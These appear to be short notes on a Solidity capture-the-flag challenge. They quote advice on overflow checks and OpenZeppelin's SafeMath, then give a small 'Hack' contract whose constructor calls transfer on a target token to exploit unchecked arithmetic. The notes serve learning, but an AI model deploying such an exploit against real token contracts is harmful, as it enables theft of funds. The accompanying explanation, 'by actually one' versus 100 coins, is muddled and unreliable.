

```
Overflows are very common in solidity and must be checked for with control statements such as:

if(a + c > a) {
  a = a + c;
}
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

a = a.add(c);
If there is an overflow, the code will revert.

```


Basically just for each deployment of the contract attack script, you increment the coin balance by actually one. 


```


contract Hack {

    constructor(address _target) public {
        IToken(_target).transfer(msg.sender, 100);
    }

}

```

This causes to send 100 coins instead of one token each increment. 


